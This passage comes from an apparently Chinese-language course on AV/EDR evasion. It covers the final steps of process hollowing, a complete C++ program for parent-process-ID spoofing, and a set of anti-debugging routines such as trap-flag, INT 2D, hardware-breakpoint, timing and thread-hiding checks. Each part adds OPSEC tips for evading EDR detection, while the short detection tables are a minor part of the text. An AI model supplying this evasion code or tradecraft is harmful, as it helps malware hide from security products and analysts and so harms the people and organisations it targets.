<h4 id="6-设置线程上下文为Payload入口点"><a href="#6-设置线程上下文为Payload入口点" class="headerlink" title="6. 设置线程上下文为Payload入口点"></a><strong>6. 设置线程上下文为Payload入口点</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">CONTEXT ctx;<br>ctx.ContextFlags = CONTEXT_FULL;<br><br><span class="hljs-built_in">GetThreadContext</span>(pi.hThread, &amp;ctx);<br>ctx.Rcx = (DWORD64)newBase; <span class="hljs-comment">// 对于x64，Rcx保存入口点</span><br><span class="hljs-built_in">SetThreadContext</span>(pi.hThread, &amp;ctx);<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="7-恢复进程"><a href="#7-恢复进程" class="headerlink" title="7. 恢复进程"></a><strong>7. 恢复进程</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ResumeThread</span>(pi.hThread);<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="实际应用示例-1"><a href="#实际应用示例-1" class="headerlink" title="实际应用示例"></a><strong>实际应用示例</strong></h3><table>
<thead>
<tr>
<th>恶意软件家族</th>
<th>空洞化的使用</th>
</tr>
</thead>
<tbody><tr>
<td><strong>TrickBot</strong></td>
<td>用于将Shellcode注入到svchost.exe中</td>
</tr>
<tr>
<td><strong>Emotet</strong></td>
<td>通过空洞化将有效载荷执行到explorer.exe中</td>
</tr>
<tr>
<td><strong>Cobalt Strike</strong></td>
<td>使用远程空洞化执行beacon</td>
</tr>
</tbody></table>
<hr>
<h3 id="OPSEC考虑"><a href="#OPSEC考虑" class="headerlink" title="OPSEC考虑"></a><strong>OPSEC考虑</strong></h3><ul>
<li><p>使用**<code>NtUnmapViewOfSection</code>** 从<code>ntdll</code>而非API存根来避免EDR钩子。</p>
</li>
<li><p>对Payload进行加密或编码，并在执行时解码。</p>
</li>
<li><p>随机化<strong>目标进程</strong>以规避行为检测。</p>
</li>
<li><p>在写入后<strong>再更改内存保护</strong>（RW → RX）。</p>
</li>
<li><p>使用<strong>手动映射</strong>来避免触发加载器活动。</p>
</li>
</ul>
<hr>
<h3 id="检测向量-1"><a href="#检测向量-1" class="headerlink" title="检测向量"></a><strong>检测向量</strong></h3><table>
<thead>
<tr>
<th>检测向量</th>
<th>检测方法</th>
</tr>
</thead>
<tbody><tr>
<td>空洞化API模式</td>
<td>钩住<code>NtUnmapViewOfSection</code>、<code>VirtualAllocEx</code></td>
</tr>
<tr>
<td>入口点篡改</td>
<td>恢复前监控线程上下文</td>
</tr>
<tr>
<td>RWX内存节</td>
<td>内存扫描器，使用熵值和保护扫描</td>
</tr>
<tr>
<td>空洞化目标列表</td>
<td>已知的LOLbins，如notepad.exe、svchost.exe</td>
</tr>
</tbody></table>
<hr>
<h3 id="扩展：进程替换与PE映像"><a href="#扩展：进程替换与PE映像" class="headerlink" title="扩展：进程替换与PE映像"></a><strong>扩展：进程替换与PE映像</strong></h3><p>你还可以：</p>
<ul>
<li><p>将完整的PE文件读取到内存中。</p>
</li>
<li><p>手动映射头文件&#x2F;节。</p>
</li>
<li><p>修复导入和重定位。</p>
</li>
<li><p>在远程进程中替换内存映像。</p>
</li>
</ul>
<h2 id="AV-EDR规避实用技术-6-7-PPID伪造（父进程ID伪造）"><a href="#AV-EDR规避实用技术-6-7-PPID伪造（父进程ID伪造）" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 6.7 - PPID伪造（父进程ID伪造）"></a>AV&#x2F;EDR规避实用技术 - 6.7 - PPID伪造（父进程ID伪造）</h2><p><strong>技术</strong>：使用<code>CreateProcess</code>并通过<code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code>伪造父进程<br><strong>目标</strong>：通过伪造真实的父进程，规避EDR&#x2F;AV父子进程关联检测。</p>
<hr>
<h3 id="什么是PPID伪造？"><a href="#什么是PPID伪造？" class="headerlink" title="什么是PPID伪造？"></a><strong>什么是PPID伪造？</strong></h3><p>许多EDR通过分析<strong>进程树</strong>来检测恶意活动。例如：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">cmd.<span class="hljs-keyword">exe</span> → powershell.<span class="hljs-keyword">exe</span> → certutil.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>

<p>这种父子进程关系会引起警报，因为它看起来非常可疑。<br><strong>PPID伪造</strong>通过<strong>伪造合法的父进程</strong>，例如<code>explorer.exe</code>或<code>svchost.exe</code>，来操控这种关系。</p>
<hr>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a><strong>工作原理</strong></h3><p>通过使用<code>CreateProcess</code>与<code>STARTUPINFOEX</code>和<code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code>，你可以：</p>
<ul>
<li><p>设置一个<strong>看起来合法的进程</strong>作为父进程。</p>
</li>
<li><p>将恶意负载伪装成由良性进程启动。</p>
</li>
</ul>
<hr>
<h3 id="为什么有效-2"><a href="#为什么有效-2" class="headerlink" title="为什么有效"></a><strong>为什么有效</strong></h3><p>EDR通常会记录：</p>
<ul>
<li><p><strong>父进程ID（PPID）</strong>。</p>
</li>
<li><p><strong>父子进程关系</strong>。</p>
</li>
<li><p><strong>命令行</strong>。</p>
</li>
</ul>
<p>通过伪造PPID，恶意软件能够<strong>伪装成</strong>正常的行为，减少被检测的机会。</p>
<hr>
<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a><strong>需求</strong></h3><ul>
<li><p>Windows 7及以上（支持扩展的启动信息）。</p>
</li>
<li><p>目标<strong>父进程句柄</strong>，需要<code>PROCESS_CREATE_PROCESS</code>访问权限。</p>
</li>
</ul>
<hr>
<h3 id="完整的C-代码-使用CreateProcess进行PPID伪造"><a href="#完整的C-代码-使用CreateProcess进行PPID伪造" class="headerlink" title="完整的C++代码 - 使用CreateProcess进行PPID伪造"></a><strong>完整的C++代码 - 使用<code>CreateProcess</code>进行PPID伪造</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;TlHelp32.h&gt;</span></span><br><br><span class="hljs-function">DWORD <span class="hljs-title">FindProcessId</span><span class="hljs-params">(<span class="hljs-type">const</span> std::wstring&amp; processName)</span> </span>&#123;<br>    PROCESSENTRY32W processInfo = &#123; <span class="hljs-number">0</span> &#125;;<br>    processInfo.dwSize = <span class="hljs-built_in">sizeof</span>(processInfo);<br><br>    HANDLE snapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (snapshot == INVALID_HANDLE_VALUE) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">Process32FirstW</span>(snapshot, &amp;processInfo);<br>    <span class="hljs-keyword">if</span> (!processName.<span class="hljs-built_in">compare</span>(processInfo.szExeFile)) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(snapshot);<br>        <span class="hljs-keyword">return</span> processInfo.th32ProcessID;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32NextW</span>(snapshot, &amp;processInfo)) &#123;<br>        <span class="hljs-keyword">if</span> (!processName.<span class="hljs-built_in">compare</span>(processInfo.szExeFile)) &#123;<br>            <span class="hljs-built_in">CloseHandle</span>(snapshot);<br>            <span class="hljs-keyword">return</span> processInfo.th32ProcessID;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">CloseHandle</span>(snapshot);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// Step 1: Find a legitimate process to spoof, e.g. explorer.exe</span><br>    DWORD parentPid = <span class="hljs-built_in">FindProcessId</span>(<span class="hljs-string">L&quot;explorer.exe&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!parentPid) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;[-] Could not find explorer.exe\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Step 2: Open the process handle</span><br>    HANDLE hParent = <span class="hljs-built_in">OpenProcess</span>(PROCESS_CREATE_PROCESS, FALSE, parentPid);<br>    <span class="hljs-keyword">if</span> (!hParent) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;[-] Failed to open parent process\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Step 3: Set up attribute list for spoofing PPID</span><br>    STARTUPINFOEXA si = &#123; <span class="hljs-number">0</span> &#125;;<br>    PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br>    SIZE_T attrSize = <span class="hljs-number">0</span>;<br><br>    si.StartupInfo.cb = <span class="hljs-built_in">sizeof</span>(STARTUPINFOEXA);<br>    <span class="hljs-built_in">InitializeProcThreadAttributeList</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;attrSize);<br>    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)<span class="hljs-built_in">HeapAlloc</span>(<br>        <span class="hljs-built_in">GetProcessHeap</span>(), <span class="hljs-number">0</span>, attrSize);<br><br>    <span class="hljs-built_in">InitializeProcThreadAttributeList</span>(si.lpAttributeList, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;attrSize);<br>    <span class="hljs-built_in">UpdateProcThreadAttribute</span>(<br>        si.lpAttributeList,<br>        <span class="hljs-number">0</span>,<br>        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,<br>        &amp;hParent,<br>        <span class="hljs-built_in">sizeof</span>(HANDLE),<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span><br>    );<br><br>    <span class="hljs-comment">// Step 4: Create the new process with spoofed parent</span><br>    <span class="hljs-type">char</span> cmdLine[] = <span class="hljs-string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreateProcessA</span>(<br>        <span class="hljs-literal">NULL</span>,<br>        cmdLine,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        FALSE,<br>        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        &amp;si.StartupInfo,<br>        &amp;pi)) &#123;<br><br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;[-] Failed to create process: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] Process created with spoofed parent!\n&quot;</span>;<br><br>    <span class="hljs-built_in">DeleteProcThreadAttributeList</span>(si.lpAttributeList);<br>    <span class="hljs-built_in">HeapFree</span>(<span class="hljs-built_in">GetProcessHeap</span>(), <span class="hljs-number">0</span>, si.lpAttributeList);<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>    <span class="hljs-built_in">CloseHandle</span>(hParent);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="实际使用案例"><a href="#实际使用案例" class="headerlink" title="实际使用案例"></a><strong>实际使用案例</strong></h3><table>
<thead>
<tr>
<th>恶意软件 &#x2F; 工具</th>
<th>PPID伪造的使用</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Cobalt Strike</strong></td>
<td>beacon通常伪造父进程为<code>explorer.exe</code></td>
</tr>
<tr>
<td><strong>SharpSploit</strong></td>
<td>红队使用<code>CreateSpoofedProcess()</code>进行PPID伪造</td>
</tr>
<tr>
<td><strong>FIN7 &#x2F; APT32</strong></td>
<td>在<code>rundll32.exe</code>链中使用PPID伪造</td>
</tr>
</tbody></table>
<hr>
<h3 id="OPSEC提示"><a href="#OPSEC提示" class="headerlink" title="OPSEC提示"></a><strong>OPSEC提示</strong></h3><ul>
<li><p>避免使用<code>cmd.exe</code>或<code>powershell.exe</code>作为目标进程。</p>
</li>
<li><p>匹配父子进程的命令行预期。</p>
</li>
<li><p>与<strong>命令行伪造</strong>结合使用（再次使用<code>UpdateProcThreadAttribute</code>）。</p>
</li>
<li><p>确保<strong>令牌&#x2F;ACL与伪造的父进程环境匹配</strong>。</p>
</li>
<li><p>与<strong>无参数执行</strong>结合使用（例如<code>rundll32</code>或<code>mshta</code>）。</p>
</li>
</ul>
<hr>
<h3 id="检测向量-2"><a href="#检测向量-2" class="headerlink" title="检测向量"></a><strong>检测向量</strong></h3><table>
<thead>
<tr>
<th>检测向量</th>
<th>检测方法</th>
</tr>
</thead>
<tbody><tr>
<td>不寻常的PPID</td>
<td>通过父子进程路径不匹配的关联</td>
</tr>
<tr>
<td>创建进程</td>
<td>使用<code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code>的<code>CreateProcess</code></td>
</tr>
<tr>
<td>ACL不匹配</td>
<td>与父进程的令牌提升匹配</td>
</tr>
<tr>
<td>遥测偏差</td>
<td>与命令行、时间差的父进程不匹配</td>
</tr>
</tbody></table>
<h1 id="模块-7-–-反分析与高级规避"><a href="#模块-7-–-反分析与高级规避" class="headerlink" title="模块 7 – 反分析与高级规避"></a>模块 7 – 反分析与高级规避</h1><h2 id="AV-EDR规避实用技术-7-1-反调试技术"><a href="#AV-EDR规避实用技术-7-1-反调试技术" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 7.1 - 反调试技术"></a>AV&#x2F;EDR规避实用技术 - 7.1 - 反调试技术</h2><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a><strong>目标</strong></h3><p>通过使用低级系统检查、陷阱、内存破坏和未记录的Windows内部功能，实施分层防御，打扰或欺骗<strong>逆向工程师</strong>、<strong>调试器</strong>和<strong>沙箱分析师</strong>。</p>
<hr>
<h3 id="反调试技术类别"><a href="#反调试技术类别" class="headerlink" title="反调试技术类别"></a><strong>反调试技术类别</strong></h3><table>
<thead>
<tr>
<th>类别</th>
<th>示例API &#x2F; 概念</th>
</tr>
</thead>
<tbody><tr>
<td>基于API的检查</td>
<td>IsDebuggerPresent, CheckRemoteDebuggerPresent, NtQueryInformationProcess等</td>
</tr>
<tr>
<td>PEB&#x2F;TEB检查</td>
<td>BeingDebugged, NtGlobalFlag, 堆标志</td>
</tr>
<tr>
<td>基于陷阱</td>
<td>INT 3, ICEBP, 单步调试, INT 2D, 前缀跳跃</td>
</tr>
<tr>
<td>基于时间</td>
<td>RDTSC, QueryPerformanceCounter, GetTickCount</td>
</tr>
<tr>
<td>硬件特性</td>
<td>调试寄存器（Dr0–Dr7），线程隐藏，硬件断点</td>
</tr>
<tr>
<td>结构化异常处理</td>
<td>SEH, VEH陷阱，检测调试器干扰</td>
</tr>
<tr>
<td>内存操控</td>
<td>设置硬件断点，检查代码页</td>
</tr>
<tr>
<td>内核回调</td>
<td>未覆盖（需要内核驱动）</td>
</tr>
</tbody></table>
<hr>
<h3 id="高级技术-代码"><a href="#高级技术-代码" class="headerlink" title="高级技术 + 代码"></a><strong>高级技术 + 代码</strong></h3><h3 id="1-PEB-NtGlobalFlag-检测"><a href="#1-PEB-NtGlobalFlag-检测" class="headerlink" title="1. PEB.NtGlobalFlag 检测"></a>1. <strong>PEB.NtGlobalFlag 检测</strong></h3><p>检查堆标志是否被更改（调试器中常见）。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">CheckNtGlobalFlag</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _M_X64</span><br>    PPEB pPeb = (PPEB)__readgsqword(<span class="hljs-number">0x60</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    PPEB pPeb = (PPEB)__readfsdword(<span class="hljs-number">0x30</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">return</span> (pPeb-&gt;NtGlobalFlag &amp; <span class="hljs-number">0x70</span>) != <span class="hljs-number">0</span>; <span class="hljs-comment">// 典型的调试标志</span><br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>标志 <code>0x70</code> &#x3D; <code>FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS</code></p>
</blockquote>
<hr>
<h3 id="2-通过EFLAGS设置陷阱标志（单步调试）"><a href="#2-通过EFLAGS设置陷阱标志（单步调试）" class="headerlink" title="2. 通过EFLAGS设置陷阱标志（单步调试）"></a>2. <strong>通过<code>EFLAGS</code>设置陷阱标志（单步调试）</strong></h3><p>设置TF位来引发单步异常。调试器通常会以不同的方式处理它。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">TrapFlagCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    __try &#123;<br>        __asm &#123;<br>            pushfd<br>            <span class="hljs-keyword">or</span> dword ptr [esp], <span class="hljs-number">0x100</span> <span class="hljs-comment">// 设置Trap Flag</span><br>            popfd<br>            nop<br>        &#125;<br>    &#125;<br>    __except (EXCEPTION_EXECUTE_HANDLER) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 调试器可能会干扰单步执行</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="3-前缀跳跃（未记录的反调试技巧）"><a href="#3-前缀跳跃（未记录的反调试技巧）" class="headerlink" title="3. 前缀跳跃（未记录的反调试技巧）"></a>3. <strong>前缀跳跃（未记录的反调试技巧）</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">__declspec(naked) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrefixHop</span><span class="hljs-params">()</span> </span>&#123;<br>    __asm &#123;<br>        __emit <span class="hljs-number">0xF3</span>    <span class="hljs-comment">// REP前缀</span><br>        __emit <span class="hljs-number">0x64</span>    <span class="hljs-comment">// FS:</span><br>        __emit <span class="hljs-number">0xF1</span>    <span class="hljs-comment">// ICEBP（1字节未记录的断点）</span><br>        ret<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这可以混淆调试器，特别是那些不能正确处理混合前缀&#x2F;操作码的调试器。</p>
<hr>
<h3 id="4-INT-2D断点（防止OllyDbg-Immunity调试）"><a href="#4-INT-2D断点（防止OllyDbg-Immunity调试）" class="headerlink" title="4. INT 2D断点（防止OllyDbg &#x2F; Immunity调试）"></a>4. <strong>INT 2D断点（防止OllyDbg &#x2F; Immunity调试）</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Int2DCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    __try &#123;<br>        __asm &#123;<br>            pushad<br>            mov al, <span class="hljs-number">0</span><br>            <span class="hljs-type">int</span> <span class="hljs-number">0x2D</span><br>            popad<br>        &#125;<br>    &#125; __except (EXCEPTION_EXECUTE_HANDLER) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 调试器处理了INT 2D，而不是操作系统</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="5-硬件断点检测（DR0–DR7）"><a href="#5-硬件断点检测（DR0–DR7）" class="headerlink" title="5. 硬件断点检测（DR0–DR7）"></a>5. <strong>硬件断点检测（DR0–DR7）</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">CheckHardwareBreakpoints</span><span class="hljs-params">()</span> </span>&#123;<br>    CONTEXT ctx = &#123; <span class="hljs-number">0</span> &#125;;<br>    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetThreadContext</span>(<span class="hljs-built_in">GetCurrentThread</span>(), &amp;ctx)) &#123;<br>        <span class="hljs-keyword">if</span> (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="6-通过RDTSC进行调试器计时检测"><a href="#6-通过RDTSC进行调试器计时检测" class="headerlink" title="6. 通过RDTSC进行调试器计时检测"></a>6. <strong>通过<code>RDTSC</code>进行调试器计时检测</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">TimingCheckRDTSC</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> __int64 t1 = __rdtsc();<br>    <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">10</span>);<br>    <span class="hljs-type">unsigned</span> __int64 t2 = __rdtsc();<br><br>    <span class="hljs-keyword">return</span> (t2 - t1 &lt; <span class="hljs-number">1000000</span>); <span class="hljs-comment">// 太快 =&gt; 调试器干扰</span><br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="7-从调试器中隐藏线程"><a href="#7-从调试器中隐藏线程" class="headerlink" title="7. 从调试器中隐藏线程"></a>7. <strong>从调试器中隐藏线程</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HideThread</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* pNtSetInformationThread)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        HANDLE, THREADINFOCLASS, PVOID, ULONG)</span></span>;<br><br>    <span class="hljs-keyword">auto</span> NtSetInformationThread = (pNtSetInformationThread)<br>        <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtSetInformationThread&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (NtSetInformationThread)<br>        <span class="hljs-built_in">NtSetInformationThread</span>(<span class="hljs-built_in">GetCurrentThread</span>(), (THREADINFOCLASS)<span class="hljs-number">0x11</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="8-自我调试技术（DebugObject检查）"><a href="#8-自我调试技术（DebugObject检查）" class="headerlink" title="8. 自我调试技术（DebugObject检查）"></a><strong>8. 自我调试技术（DebugObject检查）</strong></h3><p>一个进程不能被两个调试器调试。您可以调用<code>DebugActiveProcess(GetCurrentProcessId())</code>来进行自我调试。如果失败，说明另一个调试器已经连接。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SelfDebugCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">DebugActiveProcess</span>(<span class="hljs-built_in">GetCurrentProcessId</span>())) &#123;<br>        <span class="hljs-built_in">DebugActiveProcessStop</span>(<span class="hljs-built_in">GetCurrentProcessId</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 没有其他调试器存在</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 另一个调试器阻止了该调用</span><br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="9-通过NtSetInformationThread隐藏线程"><a href="#9-通过NtSetInformationThread隐藏线程" class="headerlink" title="9. 通过NtSetInformationThread隐藏线程"></a><strong>9. 通过NtSetInformationThread隐藏线程</strong></h3><p>我们之前使用它来隐藏线程，下面是执行负载时不会被断点击中的更隐蔽方法。</p>
